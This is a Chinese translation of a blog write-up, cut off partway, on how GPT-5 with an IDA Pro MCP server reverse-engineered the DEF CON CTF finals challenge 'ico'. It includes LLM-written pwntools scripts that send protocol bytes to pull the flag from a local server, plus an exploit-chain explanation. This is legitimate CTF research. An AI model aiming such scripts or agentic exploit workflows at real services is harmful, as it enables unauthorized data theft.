<!DOCTYPE html>
<html>
<head>
<title>AIxCC-shellphish.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<blockquote>
<p>參考工具如下：</p>
<ul>
<li>https://github.com/patched-codes/patchwork<br>
一個基於 CLI 的自動化框架，使用大型語言模型 (LLM) 來自動化開發工作流程，如代碼審查、漏洞修復、安全補丁和文檔生成等開發雜務。</li>
<li>https://github.com/mrexodia/ida-pro-mcp<br>
在 IDA Pro 上提供簡潔的 MCP 伺服器與外掛，支援從列舉函式、全域、字串，到反組譯/反編譯、交叉參照、原型/型別/命名批次調整與（選用）除錯控制等工具呼叫，便於「氛圍逆向」中以代理協同完成重複分析操作與產出報告。</li>
<li>https://github.com/Wh0am123/MCP-Kali-Server<br>
一個將 MCP 客戶端（如 Claude Desktop、5ire）橋接到 Kali/Linux 終端的輕量 API 伺服器，允許代理安全地執行 nmap、curl、ffuf 等終端工具以進行 AI 輔助滲透測試、CTF 挑戰與 HTB/THM 實作，並提供簡單的部署與客戶端配置流程以快速串接實戰工作流。</li>
</ul>
</blockquote>
<hr>
<h1 id="%E4%BD%A0%E6%89%80%E9%9C%80%E8%A6%81%E7%9A%84%E5%8F%AA%E6%98%AF-mcp---llms-%E8%A7%A3%E6%B1%BA-def-con-ctf-%E6%B1%BA%E8%B3%BD%E6%8C%91%E6%88%B0">你所需要的只是 MCP - LLMs 解決 DEF CON CTF 決賽挑戰</h1>
<blockquote>
<p>翻譯整理自 <a href="https://wilgibbs.com/blog/defcon-finals-mcp/">All You Need Is MCP - LLMs Solving a DEF CON CTF Finals Challenge</a><br>
同步匯整自 <a href="https://github.com/shellphish/artiphishell">https://github.com/shellphish/artiphishell</a><br>
<a href="https://twman.org">TonTon Huang Ph.D.</a><br>
2025/09/03</p>
</blockquote>
<h2 id="%E7%9B%AE%E9%8C%84">目錄</h2>
<ul>
<li><a href="#def-con-ctf">DEF CON CTF</a></li>
<li><a href="#tldr">TL;DR</a></li>
<li><a href="#%E6%8C%91%E6%88%B0-ico">挑戰 —「ico」</a></li>
<li><a href="#%E8%83%8C%E6%99%AF">背景</a></li>
<li><a href="#mcp-%E5%B0%8D%E6%88%91%E4%BE%86%E8%AA%AA%E5%A4%AA%E7%8C%9B%E4%BA%86">MCP 對我來說太猛了</a></li>
<li><a href="#%E4%BB%A4%E4%BA%BA%E5%A4%B1%E6%9C%9B%E7%9A%84%E8%85%B3%E6%9C%AC">令人失望的腳本</a></li>
<li><a href="#%E5%85%85%E6%BB%BF%E5%B8%8C%E6%9C%9B%E7%9A%84%E8%85%B3%E6%9C%AC">充滿希望的腳本</a></li>
<li><a href="#%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%8F%8D%E7%B7%A8%E8%AD%AF--%E6%9B%B4%E5%A5%BD%E7%9A%84%E8%85%B3%E6%9C%AC">更好的反編譯 == 更好的腳本</a></li>
<li><a href="#%E8%BF%91%E5%9C%A8%E5%92%AB%E5%B0%BA%E5%8F%88%E4%BC%BC%E9%81%A0%E5%9C%A8%E5%A4%A9%E9%82%8A">近在咫尺，又似遠在天邊</a></li>
<li><a href="#%E9%AD%94%E6%B3%95%E6%99%82%E5%88%BB">魔法時刻</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E8%85%B3%E6%9C%AC%E7%9C%9F%E6%AD%A3%E6%8B%BF%E5%88%B0%E6%98%8E%E6%96%87">利用腳本（真正拿到明文）</a></li>
<li><a href="#%E4%BF%AE%E8%A3%9Cthe-patch">修補（The Patch）</a></li>
<li><a href="#%E5%81%89%E5%A4%A7%E7%9A%84%E6%B0%9B%E5%9C%8D%E9%80%86%E5%90%91-vibe-ening">偉大的「氛圍逆向 (Vibe-ening)」</a></li>
</ul>
<hr>
<h2 id="%E5%BF%AB%E9%80%9F%E5%8C%AF%E6%95%B4">快速匯整</h2>
<h3 id="%E5%82%B3%E7%B5%B1%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E9%80%9A%E5%B8%B8%E5%8F%AA%E5%B0%88%E6%B3%A8%E6%96%BC%E5%96%AE%E4%B8%80%E5%8A%9F%E8%83%BD">傳統的安全分析工具通常只專注於單一功能：</h3>
<ul>
<li>靜態分析工具只能發現已知模式的漏洞</li>
<li>模糊測試工具只能觸發崩潰但無法定位根因</li>
<li>補丁工具需要人工分析和編寫</li>
</ul>
<h3 id="artiphishell-%E6%98%AF%E4%B8%80%E5%80%8B%E7%B6%9C%E5%90%88%E6%80%A7%E7%9A%84%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%92%8C%E6%BC%8F%E6%B4%9E%E7%99%BC%E7%8F%BE%E5%B9%B3%E5%8F%B0">Artiphishell 是一個綜合性的安全研究和漏洞發現平台</h3>
<ul>
<li>自動化漏洞發現 - 分析源代碼識別安全漏洞</li>
<li>漏洞驗證 - 生成 POV (Proof of Vulnerability) 演示證明漏洞可被利用</li>
<li>自動化修復 - 創建補丁來修復發現的漏洞</li>
<li>多層次分析引擎：結合靜態分析 (CodeQL)、動態模糊測試 (AFL++/Jazzer) 和 LLM 驅動的智能分析
<ul>
<li>靜態分析
<ul>
<li>CodeQL 掃描源代碼尋找已知漏洞模式</li>
<li>函數索引器分析代碼結構和調用關係</li>
</ul>
</li>
<li>動態分析：
<ul>
<li>模糊測試引擎（AFL++、LibFuzzer、Jazzer）生成測試輸入</li>
<li>語料庫管理器收集和優化測試用例</li>
</ul>
</li>
</ul>
</li>
<li>競賽級性能：專為高強度競賽環境設計，具有嚴格的資源管理和預算控制</li>
<li>雲原生部署：基於 Kubernetes 的可擴展架構</li>
</ul>
<h3 id="%E6%A0%B8%E5%BF%83%E5%AD%90%E7%B3%BB%E7%B5%B1">核心子系統</h3>
<ul>
<li>漏洞發現 - 包括 DiscoveryGuy、CodeQL 分析和 DiffGuy 代碼變更分析</li>
<li>模糊測試基礎設施 - 支持 Jazzer (Java)、LibFuzzer 和 AFL++ 管道</li>
<li>補丁生成 - 使用 PatcherQ、根因分析 (Kumu-shi) 和 LLM 補丁生成</li>
<li>LLM 和代理基礎設施 - AgentLib 和 LiteLLM 服務</li>
</ul>
<h3 id="%E7%B0%A1%E5%96%AE%E6%AF%94%E5%96%BB">簡單比喻</h3>
<p>與傳統安全工具不同，Artiphishell 不只是&quot;發現問題&quot;，而是提供從發現→驗證→修復的完整自動化流程，就像一個能獨立運作的安全專家團隊。<br>
想像 Artiphishell 就像一個全自動的網路安全診所：</p>
<ul>
<li>診斷科：DiscoveryGuy 和 CodeQL 像 X 光機和 CT 掃描，從不同角度檢查代碼尋找&quot;病灶&quot;（漏洞）</li>
<li>實驗室：模糊測試組件像病理科，通過大量測試樣本驗證問題是否真實存在</li>
<li>手術室：PatcherQ 像外科醫生，精確地&quot;開刀&quot;修復發現的問題</li>
<li>AI 助手：LLM 系統像經驗豐富的專科醫生，提供智能診斷建議和治療方案</li>
</ul>
<hr>
<h1 id="def-con-ctf">DEF CON CTF</h1>
<p>每年，世界級的戰隊都會參加像 Plaid CTF 與 HITCON CTF 這樣困難的 CTF，試圖透過拿到第一名來取得 DEF CON CTF 的資格。
通常一年只有 3–4 場 CTF 被指定為預先資格賽。
DEF CON CTF 也有一個準決賽，依年份不同，前 8–12 名隊伍可以取得決賽資格。
DEF CON CTF 幾乎與 DEF CON 本身同樣歷史悠久，是 DEF CON 的標誌性活動之一。
它吸引（而且持續吸引）會影響整個資安領域的頂尖駭客，例如 GeoHot、Zardus、Lokihardt 等。
總而言之，DEF CON CTF「就是」駭客界的奧運會，如果可以這麼說的話是總決賽的最終舞台。
挑戰很難，隊伍也都是頂尖好手雲集。</p>
<h1 id="tldr">TL;DR</h1>
<p>在為 AIxCC 花了兩年時間與 LLMs 一起工作的過程中，已經對 LLM 能與不能的邊界有了直覺。
這是第一次看到 DEF CON 決賽難度的挑戰，幾乎完全由 LLMs 解出（人為互動極少）。
在我開始之前，隊上幾位超強的駭客（salls、x3ero0、zardus 等）已經在名為「ico」的挑戰上投入大約四個小時，所以這並不是一題簡單的題目。
我覺得讓社群裡其他人也見證這件事發生很重要。
（頁面底部可下載我在 Cursor 中與 LLM 的完整對話記錄）</p>
<h1 id="%E6%8C%91%E6%88%B0-ico">挑戰 —「ico」</h1>
<p>這題是一個單一的 x86-64 二進位檔，啟動後會在 4265 埠架一個伺服器。
它不是完全靜態連結，但雖然有 1.4M 大小、接近 6k 個函式，實際上只使用了少數函式庫函式。</p>
<pre class="hljs"><code><div>[*] '/home/clasm/ctfs/dc-finals-25/ico/ico'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
</div></code></pre>
<p>有趣的是，沒有 PIE 或 stack canary，讓溢出更容易被利用。
一開始連到伺服器隨機手動傳送值沒有任何輸出。
程式在每一個新連線時都會 fork 一個子行程。
此外還有一個巨大的派發迴圈或 VM，看起來會讀取位元組並依據這些位元組執行不同的指令，其餘一切都還需要我們去摸索。</p>
<h1 id="%E8%83%8C%E6%99%AF">背景</h1>
<p>Shellphish 今年在 DEF CON 很忙，要同時打決賽 CTF 與送出我們的 AIxCC 作品。
身為 AIxCC 團隊的其中一位負責人，會展期間幾乎都在奔波，直到比賽結束後第二天才有時間看題目。
「ico」是主辦在第二天中途釋出的挑戰，當時已經有幾位我 1337 的隊友在做了。
我晚點加入並決定下場，因為我一般在 rev/pwn 還算拿手，而且看起來我們進展不多。
當時已經有一個叫做 poc_ncif.py 的互動腳本，但它只用 pwntools 傳了三個空位元組。
有些人還在逆向，其他人嘗試架設 fuzzers 看看是否有低垂果實可摘。</p>
<h1 id="mcp-%E5%B0%8D%E6%88%91%E4%BE%86%E8%AA%AA%E5%A4%AA%E7%8C%9B%E4%BA%86">MCP 對我來說太猛了</h1>
<p>我的一位隊友 mahaloz 為另一題 viper 架了 IDA MCP 伺服器，但使用起來沒有太大進展；然而也有人把原始反編譯與指令貼到 GPT 主控台就獲得了一些成功（lol）。
Blue Water 隊也讓代理在背景執行，還「解了兩題 Live CTF 挑戰」。
雖然那些挑戰比大多數 DEF CON 題目簡單一些，但這也成為我自己嘗試的靈感之一。
我們即將開會，所以我快速做了一個 Docker 容器來跑挑戰，避免破壞日常環境，並啟動了我自己的「IDA MCP 伺服器」+「Cursor」（GPT‑5 剛推出且透過 Cursor 有大量免費代幣），讓它在一個部分逆向的「ico」上運行，初始提示如下。</p>
<blockquote>
<p>你是我見過最強的逆向工程師，使用 Ida pro MCP 與這個二進位互動並進行逆向；我們知道這是一個伺服器應用，但除此之外不清楚太多；若需要更多資訊或任何重要決策，請隨時詢問。<br>
You are the most amazing reverse engineer I’ve ever met. Use the Ida pro MCP to interact and reverse the binary. We’re looking at a server application, but we don’t know much more than that. Feel free to ask me anything you need more information on or any important decisions that need to be made</p>
</blockquote>
<p>這是我第一次使用 GPT‑5，我要說：它跑了，而且不停地跑。
它使用了我見過最多的工具呼叫次數，儘管我也試過 claude‑4‑sonnet、claude‑4‑opus、o3 等模型；最後會議結束，我得以查看結果。
它在完全無人協助下至少跑了 12 分鐘，並給了我們第一個腳本。</p>
<h1 id="%E4%BB%A4%E4%BA%BA%E5%A4%B1%E6%9C%9B%E7%9A%84%E8%85%B3%E6%9C%AC">令人失望的腳本</h1>
<pre class="hljs"><code><div>from pwn import remote  # type: ignore
import os, sys, time

host = os.environ.get(&quot;HOST&quot;, &quot;127.0.0.1&quot;)
port = int(os.environ.get(&quot;PORT&quot;, &quot;4265&quot;))

io = remote(host, port)

# handshake
io.send(b&quot;\x10&quot;)       # enable
time.sleep(0.05)

# create default entry that copies /flag into &quot;Author&quot;
io.send(b&quot;\x22&quot;)
time.sleep(0.05)

# request metadata bundle: Author (flag), Software, (Comment if set)
io.send(b&quot;\x32&quot; + b&quot;\x01&quot;)   # 0x01 arbitrary small param

data = io.recv(timeout=2) or b&quot;&quot;
print(f&quot;len={len(data)} hex={data.hex()}&quot;)

# Heuristic extract: look for ASCII 'Author' then next string-ish bytes
idx = data.find(b&quot;Author&quot;)
if idx != -1:
    # naive slice forward; adjust if you want a proper parser
    print(&quot;Found 'Author' near:&quot;, idx)
    print(data[idx:idx+256])

# clean close (optional)
io.send(b&quot;\x11&quot;)
io.close()
</div></code></pre>
<pre class="hljs"><code><div>[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
len=2 hex=0001
[*] Closed connection to 127.0.0.1 port 4265
</div></code></pre>
<p>我立刻跑了腳本，結果令人失望——它可以跑但拿不到 flag，但那不就是 AI 糊常有的情況嗎。
然而，這個不管用的腳本同時帶來一些相當有趣的發現：</p>
<pre class="hljs"><code><div>每次連線、在處理命令之前，它會把 /flag 的內容載入到全域字串緩衝區 off_51C2E0：
idk_what_this_is_man → 設定路徑為 &quot;/flag&quot;，讀取，並把指標存入 off_51C2E0。

0x32：回傳一個打包的中繼資料區塊，包含：
- &quot;Author&quot; → 直接是 +40 處的字串（也就是 flag）
- &quot;Comment&quot;（只有在先前透過 0x31 設定過的情況）
- &quot;Software&quot; → +72 處的字串
- 在 0x32 後需要一個額外位元組（任意小值；用作維度）
</div></code></pre>
<p>讓我們實際看看反編譯，確認 flag 在哪裡被設定，以及驗證 LLM 的說法是否正確。</p>
<p><img src="https://raw.githubusercontent.com/Deep-Learning-101/TonTon/refs/heads/main/img/2025-09-03-001.png" alt="IDA 中的 Flag 讀取函數"></p>
<p>在 sub_45EFE0 裡，我們看到 /flag 字串與一些值透過呼叫在傳遞，我不完全確定這些呼叫在做什麼，但結構讓我覺得很像 C++，所以我暫時相信 LLM 所說的，最終 /flag 的內容會落到 off_51C2E0。</p>
<p><img src="https://raw.githubusercontent.com/Deep-Learning-101/TonTon/refs/heads/main/img/2025-09-03-002.png" alt="IDA 中的全局字符串截圖"></p>
<p>我們可以看到，一開始 off_51C2E0 包含指向字串「fuzyll」的指標，他是 Nautilus Institute（本題主辦）的一員，也很可能是這題的作者。
LLM 也建議把腳本輸出格式化得更好，我同意了，因為原本輸出很乏味，而且我仍然不清楚眼前這東西的全貌。</p>
<blockquote>
<p>Please add a nice and clean parser!</p>
</blockquote>
<h1 id="%E5%85%85%E6%BB%BF%E5%B8%8C%E6%9C%9B%E7%9A%84%E8%85%B3%E6%9C%AC">充滿希望的腳本</h1>
<pre class="hljs"><code><div>from __future__ import annotations

from pwn import remote  # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List


# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -&gt; None:
    io.send(data)


def read_exact(io, n: int, timeout: float = 2.0) -&gt; bytes:
    data = b&quot;&quot;
    while len(data) &lt; n:
        chunk = io.recv(n - len(data), timeout=timeout)
        if not chunk:
            break
        data += chunk
    return data


def read_chunk(io, timeout: float = 2.0) -&gt; Optional[Tuple[int, bytes]]:
    &quot;&quot;&quot;Read one server chunk: 1-byte tag + 2-byte little-endian length + payload.&quot;&quot;&quot;
    hdr = read_exact(io, 3, timeout=timeout)
    if len(hdr) &lt; 3:
        return None
    tag = hdr[0]
    length = hdr[1] | (hdr[2] &lt;&lt; 8)
    payload = read_exact(io, length, timeout=timeout)
    if len(payload) &lt; length:
        return None
    return tag, payload


# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb&quot;[ -~]{1,256}&quot;)


def tokenize_printables(data: bytes) -&gt; List[bytes]:
    return [m.group(0) for m in PRINTABLE_RE.finditer(data)]


def parse_kv_payload(payload: bytes) -&gt; Dict[str, str]:
    &quot;&quot;&quot;Best-effort parse of a key/value bundle produced by opcode 0x32.

    The server serializes a small structure with fields like &quot;Author&quot;, &quot;Comment&quot;,
    and &quot;Software&quot; using an internal container format. We conservatively scan the
    payload for printable tokens and map well-known keys to the token that follows.
    &quot;&quot;&quot;
    tokens = tokenize_printables(payload)
    keys = {b&quot;Author&quot;, b&quot;Comment&quot;, b&quot;Software&quot;}
    out: Dict[str, str] = {}
    for i, tok in enumerate(tokens):
        if tok in keys and i + 1 &lt; len(tokens):
            # Prefer the very next printable token as the value
            key = tok.decode(&quot;ascii&quot;, errors=&quot;ignore&quot;)
            val = tokens[i + 1].decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
            # Guard against obviously invalid huge values
            if len(val) &gt; 0:
                out[key] = val
    return out


# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -&gt; Tuple[Optional[Dict[str, str]], bytes]:
    # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
    send_cmd(io, b&quot;\x10&quot;)
    io.recv(timeout=0.1)  # ignore 1-byte ack if present
    send_cmd(io, b&quot;\x22&quot;)
    io.recv(timeout=0.1)
    send_cmd(io, b&quot;\x32\x01&quot;)

    chunk = read_chunk(io, timeout=2.0)
    if not chunk:
        return None, b&quot;&quot;
    tag, payload = chunk
    parsed = parse_kv_payload(payload)
    return parsed, payload


def main():
    host = os.environ.get(&quot;HOST&quot;, &quot;127.0.0.1&quot;)
    port = int(os.environ.get(&quot;PORT&quot;, &quot;4265&quot;))
    io = remote(host, port)
    try:
        kv, raw = exploit_fetch_metadata(io)
        if kv:
            print(&quot;Parsed fields:&quot;)
            for k in (&quot;Author&quot;, &quot;Comment&quot;, &quot;Software&quot;):
                if k in kv:
                    print(f&quot;- {k}: {kv[k]}&quot;)
            if &quot;Author&quot; in kv:
                print(f&quot;\nAuthor (likely flag): {kv['Author']}&quot;)
        else:
            print(f&quot;No parsable KV bundle. Raw chunk ({len(raw)} bytes): {raw.hex()}&quot;)
    finally:
        try:
            send_cmd(io, b&quot;\x11&quot;)  # close session politely
        except Exception:
            pass
        io.close()


if __name__ == &quot;__main__&quot;:
    main()
</div></code></pre>
<pre class="hljs"><code><div>[x] Opening connection to 127.0.0.1 on port 4265
[x] Opening connection to 127.0.0.1 on port 4265: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4265: Done
No parsable KV bundle. Raw chunk (153 bytes): 89504e470d0a1a0a0000000d494844520000000200000002080600000072b60d240000001049444154789c63606060f80fc51002001cf502fe6a1cd9170000002774455874417574686f72004433454236413636393436383137434438423834463533304333303833414539388d42bd0000001174455874536f6674776172650069636f2076302e3155c7b0f20000000049454e44ae426082
[*] Closed connection to 127.0.0.1 port 4265
</div></code></pre>
<p>不僅腳本比前一版更長、結構也更好，且實際從伺服器拿到漂亮的輸出。
顯然，這段十六進位字串不理想，所以我用 xxd 轉一下來看，有一些看起來像 ASCII 的字節。</p>
<pre class="hljs"><code><div>00000010: 0000 0002 0000 0002 0806 0000 0072 b60d  .............r..
00000020: 2400 0000 1049 4441 5478 9c63 6060 60f8  $....IDATx.c```.
00000030: 0fc5 1002 001c f502 fe6a 1cd9 1700 0000  .........j......
00000040: 2774 4558 7441 7574 686f 7200 3142 3542  'tEXtAuthor.1B5B
00000050: 3535 4534 3234 3233 3742 3046 4637 3044  55E424237B0FF70D
00000060: 3244 4145 3644 3739 4632 3236 92fa 8501  2DAE6D79F226....
00000070: 0000 0011 7445 5874 536f 6674 7761 7265  ....tEXtSoftware
00000080: 0069 636f 2076 302e 3155 c7b0 f200 0000  .ico v0.1U......
00000090: 0049 454e 44ae 4260 82                   .IEND.B`.
</div></code></pre>
<p>在（其實算是第一次）看了 IDA 之後，感覺 flag 確實被寫入 LLM 提到的全域變數，接著用來設定 Author 標籤，但中間有不少我不明白用途的額外函式呼叫。
位元組流裡屬於 Author 的那一段，絕對不是之前硬編碼的「fuzyll」，而是一個我不認得的值，顯示我們更進一步了，但不確定為何這個值不是 flag。</p>
<h1 id="%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%8F%8D%E7%B7%A8%E8%AD%AF--%E6%9B%B4%E5%A5%BD%E7%9A%84%E8%85%B3%E6%9C%AC">更好的反編譯 == 更好的腳本</h1>
<blockquote>
<p>Now take all of this information and edit the decompilation with all your new findings</p>
</blockquote>
<pre class="hljs"><code><div>Applied thorough IDA updates:
- Renamed key routines: server_main, accept_fork_loop, handle_connection, dispatch_loop, drop_privileges_to_user, set_alarm_seconds, recv_checked, send_checked, send_ack, send_nack, send_tagged_blob, read_u16_le, recv_allocated_blob, command handlers cmd_*, init_flag_from_file, init_default_metadata_with_flag, metadata getters get_author/get_software/get_comment_value, and parse_ncif_container.
- Renamed global off_51C2E0 to g_FlagString.
- Added comments summarizing protocol and exfil path on dispatch_loop, cmd_send_metadata_bundle, init_flag_from_file, init_default_metadata_with_flag, server_main, and helpers.

Impact:
The decompilation now clearly reflects the protocol, the /flag loading, and the metadata flow used for exfil.
</div></code></pre>
<p>把目前所有資訊都回灌到反編譯結果裡，重新命名關鍵函式、全域與在派發迴圈等處加上註解，讓協定與外洩路徑更清楚。
儘管完成了多數逆向，我仍不確定它是否真的明白自己在做什麼，所以我請它解釋完整的利用鏈，尤其是當原本應該是 flag 的內容仍是一串不明的字串時。</p>
<blockquote>
<p>please explain the full exploit chain</p>
</blockquote>
<pre class="hljs"><code><div>Full exploit chain (concise)
Server boot

server_main: 
sets PORT (default 4265), creates listening socket.

accept_fork_loop: 
accept(), fork(). 

In child: 
drop_privileges_to_user, set_alarm_seconds(16), close listen fd, then handle_connection.

Per-connection setup
handle_connection first calls init_flag_from_file:
Opens “/flag”, reads it, and stores the string globally in g_FlagString.

Enters dispatch_loop (byte-oriented protocol).

Handshake requirement
Until session is “enabled”, the loop only reacts to:

0x10 → send_byte_0: sets a flag to enable the session and replies with 1-byte ack.

0x11 → end session.

After 0x10, the full switch is active.
Data model (entries)
The server maintains a list; field_10 is “current index”.

init_default_metadata_with_flag creates a new entry with:
Author = g_FlagString (the contents of “/flag”),
Software = “ico v0.1”,
optional Comment (set via another command).

Minimal exfil path
0x10: enable session.
0x22: cmd_create_default_entry → creates/selects entry with Author = g_FlagString.
0x32 &lt;1 byte param&gt;: cmd_send_metadata_bundle → sends a bundle that includes:
“Author” = g_FlagString,
“Comment” if previously set,
“Software”.

The bundle is sent via send_tagged_blob: 1-byte tag, 2-byte little-endian length, then payload bytes.

Why it works
init_flag_from_file loads “/flag” for every connection and saves it in g_FlagString.
cmd_create_default_entry copies that global pointer into the new entry’s Author field.
cmd_send_metadata_bundle serializes the entry and returns the Author field verbatim.

Bytes to send (in order)
b&quot;\x10&quot;
b&quot;\x22&quot;
b&quot;\x32\x01&quot;
Optionally b&quot;\x11&quot; to close.

Response parsing
Read one chunk: tag (1), length (2 LE), payload.

Payload is a small container; scanning printables, the token “Author” is followed by the flag string.
The included poc_ncif.py does this sequence and extracts “Author”.
</div></code></pre>
<p>老實說，這段解釋看起來無懈可擊，但它沒有修改任何腳本，我們仍卡住，而且它完全沒有自己動手跑腳本，所以我開放讓它實際跑起來看看，並把之後的輸出提供給它，希望能觸發更好的回應。</p>
<blockquote>
